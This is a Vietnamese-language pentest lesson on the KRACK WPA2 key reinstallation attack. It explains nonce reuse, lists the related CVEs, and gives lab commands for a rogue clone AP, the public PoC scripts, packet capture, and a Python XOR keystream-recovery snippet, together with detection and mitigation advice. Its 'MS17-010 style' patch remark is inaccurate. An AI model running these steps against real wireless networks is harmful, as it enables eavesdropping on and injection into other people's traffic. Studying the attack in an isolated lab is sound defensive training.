---
title: "08. KRACK — Key Reinstallation Attack"
type: attack
tags: [pentest, wireless, wpa2, krack, nonce-reuse, cve-2017-13077, attack, lesson-08]
aliases: [KRACK, Key Reinstallation Attack, CVE-2017-13077, Nonce Reuse]
created: 2026-04-01
---

> **Prerequisites**: [[01-wpa2-cryptographic-foundations|01. WPA2-Personal Cryptographic Foundations]]
> **Objectives**:
> - Hiểu tại sao 4-way handshake vulnerable với key reinstallation
> - Nắm cơ chế nonce reuse → keystream reuse → plaintext recovery
> - Setup MitM channel để replay Msg3
> - Phân biệt impact với AES-CCMP vs TKIP vs GCMP
> - Hiểu tại sao Android 6.0 worst-case (all-zero key)

---

## Điều kiện khai thác

> [!note] Điều kiện bắt buộc
> - Client chưa patch (Linux/Android pre-2017, hoặc unpatched wpa_supplicant)
> - Attacker có thể đặt mình giữa client và AP (MitM — cùng physical proximity)
> - Không cần biết PSK/PMK — KRACK không crack passphrase
> - Môi trường lab: mac80211_hwsim hoặc 2 wireless adapters
>
> [!warning] KRACK không crack password
> KRACK cho phép **decrypt traffic** và **inject data** nhưng không reveal WPA passphrase. Đây là protocol-level attack — sửa firmware/wpa_supplicant là đủ để patch.
>
---

## Cơ chế tấn công

### Vấn đề: 802.11i không specify khi nào install key

Formal proofs về 4-way handshake đảm bảo PMK private và authentication đúng — nhưng **không model key installation timing**. Cụ thể:

- AP có thể retransmit Msg3 nếu không nhận Msg4
- Khi client nhận Msg3 lần 2, nó **reinstall cùng PTK** và reset nonce về 0
- AES-CCMP/TKIP/GCMP dùng nonce để generate unique keystream per packet
- Nếu nonce reset → cùng keystream được dùng cho packets khác nhau

### Nonce Reuse → Keystream Reuse → Plaintext Recovery

![[img-08-krack-nonce-reuse.svg]]
*Hình 1: KRACK attack chain — Msg3 replay → nonce reset → keystream reuse → XOR decrypt*

**Với AES-CCMP** (WPA2 default):

```text
Packet 1: C1 = P1 ⊕ Keystream(TK, Nonce=0)
(Attacker lưu C1)

→ KRACK: replay Msg3 → client reinstall PTK, reset Nonce=0

Packet 2: C2 = P2 ⊕ Keystream(TK, Nonce=0)
(Cùng keystream!)

Attacker có C1 và C2:
C1 ⊕ C2 = P1 ⊕ P2
```bash

Nếu P1 có known content (TCP headers, HTTP, DNS) → recover P2. Trong thực tế:
- TCP SYN packets có known structure → recover keystream
- Dùng keystream đó để decrypt packets khác với nonce=0

**Với TKIP** (WPA hoặc WPA2-TKIP mixed):
- Ngoài decrypt còn có thể **forge frames** (xem Lesson 09)

**Android 6.0 worst case**:
wpa_supplicant 2.4/2.5 trên Android có bug: khi reinstall key, nó clear TK về all-zeros:
```text
Installed TK = 0x000000000000000000000000000000000000
→ Keystream = AES(all-zero key, nonce)
→ Attacker biết keystream hoàn toàn → decrypt ALL traffic
```

### CVE Inventory

| CVE | Attack vector | Impact |
|-----|--------------|--------|
| CVE-2017-13077 | Reinstall PTK trong 4-way HS | Decrypt (CCMP) / Forge (TKIP) |
| CVE-2017-13078 | Reinstall GTK trong 4-way HS | Replay broadcast |
| CVE-2017-13079 | Reinstall IGTK trong 4-way HS | Forge management frames |
| CVE-2017-13080 | Reinstall GTK trong group key HS | Replay broadcast |
| CVE-2017-13082 | Fast BSS Transition — AP side | AP bị attack |
| CVE-2017-13086 | TDLS PeerKey reinstall | Peer-to-peer |

---

## Quy trình tấn công

**Môi trường**: Local lab với mac80211_hwsim (Kali VM), target: Android 6.0 emulator.

**Bước 1 — Setup lab environment**

```bash
# Load mac80211_hwsim module (tạo virtual wireless interfaces)
sudo modprobe mac80211_hwsim radios=4
# Tạo 4 virtual radios: wlan0 (attacker/AP clone), wlan1 (real AP), wlan2 (client), wlan3 (monitor)

# Verify
iwconfig | grep wlan
```bash

**Bước 2 — Clone PoC từ krackattacks.com**

```bash
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts
pip install -r requirements.txt

# Đọc README — quan trọng để setup đúng
cat README.md
```bash

**Bước 3 — Setup MitM channel**

KRACK yêu cầu attacker ở giữa client và AP. Technique chuẩn:

```bash
# 1. Attacker clone AP trên channel KHÁC (ví dụ AP real dùng CH6, clone dùng CH11)
# 2. Client connect đến clone (cùng BSSID, ESSID — signal mạnh hơn)
# 3. Attacker forward traffic giữa client và real AP

# Script setup channel-based MitM:
cd krackattacks-scripts/krackattack
sudo python3 krack-ft-test.py wlan0 wlan1 AA:BB:CC:DD:EE:FF
# wlan0: interface đối diện với client (clone AP)
# wlan1: interface đối diện với real AP
# AA:BB:CC:DD:EE:FF: BSSID của real AP
```bash

**Bước 4 — Test client vulnerability**

```bash
# Script test tự động (không cần active exploit)
cd krackattacks-scripts/krackattack
sudo python3 krack-test-client.py
```

> **Expected output**:
> ```bash
> [15:30:01] Captured Msg4 of 4-way handshake
> [15:30:01] Replaying Msg3 of 4-way handshake
> [15:30:02] Got a Msg4 reply after replay → client reinstalls PTK
> [15:30:02] CLIENT IS VULNERABLE TO KEY REINSTALLATION ATTACKS
> ```

**Bước 5 — Observe nonce reuse**

```bash
# Capture traffic với tcpdump trong khi attack
sudo tcpdump -i wlan0 -w krack_capture.pcap

# Trong Wireshark, filter CCMP packets:
# wlan.fc.protected == 1 && wlan.fc.type_subtype == 0x28

# Kiểm tra CCMP Packet Number (PN) reset:
# Nếu thấy PN counter giảm hoặc reset về 0 → nonce reuse confirmed
```python

**Bước 6 — XOR decrypt (manual)**

```python
# Python script để XOR decrypt với known keystream
# Giả định đã biết plaintext của packet đầu (TCP SYN)
known_plain = b'\x45\x00\x00\x3c\x00\x00\x40\x00'  # IP+TCP header prefix
ciphertext1 = bytes.fromhex('...')  # first encrypted packet
ciphertext2 = bytes.fromhex('...')  # second packet (same nonce)

# Recover keystream từ known plaintext
keystream = bytes(a ^ b for a, b in zip(known_plain, ciphertext1[:len(known_plain)]))

# Decrypt second packet với recovered keystream
decrypted = bytes(a ^ b for a, b in zip(keystream, ciphertext2[:len(keystream)]))
print(decrypted)
```bash

---

## Biến thể & Bypass

### Fast BSS Transition attack (AP-side, CVE-2017-13082)

```bash
# Attack AP trực tiếp (không cần vulnerable client!)
sudo python3 krack-ft-test.py wlan0 wlan1 AA:BB:CC:DD:EE:FF --ft
```bash

### Group Key Reinstallation (CVE-2017-13080)

Broadcast traffic decryption:

```bash
# Trigger group key reinstallation
sudo python3 krack-test-client.py --group
# Replay group key handshake Msg1
```

### GCMP attack (Wi-Fi 802.11ad / WiGig)

GCMP dùng cùng authentication key cho cả hai directions → forge packets in **both directions**:

```python
# GCMP: GHASH(auth_key, ciphertext)
# Nếu nonce reuse → recover auth_key → forge arbitrary frames
```bash

---

## Cây quyết định

```mermaid
flowchart TD
    A[Target client OS?] -->|Android 6.0 unpatched| B[All-zero TK exploit<br>toàn bộ traffic decrypt]
    A -->|Linux wpa_supplicant 2.4-2.5| C[All-zero TK exploit]
    A -->|Windows/iOS patched| D[Kiểm tra patch status]
    A -->|AP side FT| E[CVE-2017-13082 AP attack]
    B --> F[Setup MitM channel]
    C --> F
    D --> G{Patch applied?}
    G -->|Không| F
    G -->|Có| H[Client không vulnerable]
    F --> I[Clone AP + different channel]
    I --> J[Replay Msg3]
    J --> K{Client reinstall key?}
    K -->|Có| L{Cipher?}
    K -->|Không| H
    L -->|AES-CCMP| M[Decrypt via keystream XOR]
    L -->|TKIP| N[Decrypt + MIC key recovery + Lesson 09]
    L -->|GCMP| O[Forge both directions]
```bash

---

## Command Cheatsheet

**Lab setup**

```bash
# Virtual wireless
sudo modprobe mac80211_hwsim radios=4

# Clone PoC
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts && pip install -r requirements.txt
```bash

**Test vulnerability**

```bash
# Test client
sudo python3 krack-test-client.py

# Test FT (AP side)
sudo python3 krack-ft-test.py wlan0 wlan1 <BSSID>
```

**MitM channel setup**

```bash
# Clone AP trên channel khác
# AP real: CH6, Clone: CH11
hostapd-wpe /etc/hostapd/clone.conf
# clone.conf: cùng SSID/BSSID nhưng channel=11
```bash

**Monitor nonce reuse**

```bash
# Capture encrypted traffic
sudo tcpdump -i wlan0 -w capture.pcap type data

# Wireshark filter (encrypted data frames)
# wlan.fc.protected == 1
```text

---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 7 ngày đầu.

**Drill 1 — Giải thích KRACK mechanism**
Mục tiêu: giải thích tại sao nonce reuse xảy ra.

```text
1. AP retransmit Msg3 nếu không nhận ACK
2. Client nhận Msg3 lần 2 → reinstall PTK
3. Nonce counter reset về 0
4. Cùng keystream → XOR decrypt
```

Luyện cho đến khi: giải thích 4 bước trong 30 giây không notes.

**Drill 2 — CVE mapping**
Mục tiêu: nhớ CVE-2017-13077 và impact của nó.

```text
13077: PTK reinstall (4-way) → decrypt CCMP, forge TKIP
13082: FT PTK reinstall (AP side) → AP vulnerable
```python

Luyện cho đến khi: nhớ 2 CVE quan trọng nhất.

**Drill 3 — XOR keystream recovery (code)**
Mục tiêu: viết được Python snippet từ đầu.

```python
ks = bytes(p ^ c for p, c in zip(known_plain, ciphertext1))
decrypted = bytes(k ^ c for k, c in zip(ks, ciphertext2))
```bash

Luyện cho đến khi: viết được 2 lines này trong 30 giây.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **Network**: Nonce counter không tăng dần trong CCMP PN field
> **IDS**: Duplicate EAPOL Msg3 trong capture (bình thường chỉ có 1)
> **WIDS**: Rogue AP cùng BSSID trên channel khác
>
> [!note] Mitigation
> - **Patch wpa_supplicant và firmware** — patches từ 10/2017 available cho tất cả major OSes
> - Windows 10: patch MS17-010 style (tự động update)
> - Linux: `wpa_supplicant >= 2.6` đã patch
> - Android: Security patch 2017-11-01 hoặc mới hơn
> - **Enable 802.11w PMF**: Không ngăn KRACK nhưng giảm một số attack vectors
> - **WPA3**: SAE không vulnerable vì PTK không thể reinstall
>
---

## Lab Thực hành

| Platform | Environment | Technique |
|----------|-------------|---------|
| Local | Kali + mac80211_hwsim + unpatched wpa_supplicant | Full KRACK PoC |
| Local | Android 6.0 emulator (AVD) | All-zero TK exploit |
| Local | Wireshark phân tích capture | Nonce reuse observation |
| Local | Custom Python script | XOR decryption |

Setup unpatched wpa_supplicant:
```bash
# Download vulnerable version
wget https://w1.fi/releases/wpa_supplicant-2.4.tar.gz
tar xf wpa_supplicant-2.4.tar.gz
cd wpa_supplicant-2.4/wpa_supplicant
# Compile và test trong VM isolated
```

---

## Field Manual Entry

> [!abstract] KRACK Attack — Quick Reference
> **Điều kiện**: Unpatched client (wpa_supplicant < 2.6, Android pre-Nov 2017), attacker trong range
> **Lệnh nhanh**: `python3 krack-test-client.py` (PoC từ krackattacks.com)
> **Full flow**: Setup MitM (clone AP, diff channel) → replay Msg3 → observe nonce reset → XOR decrypt
> **Look for**: "CLIENT IS VULNERABLE" trong PoC output; PN reset trong Wireshark
> **Detection**: Duplicate Msg3 trong EAPOL captures; rogue AP alert
> **Ref**: [[08-krack-key-reinstallation|08. KRACK Key Reinstallation]]
>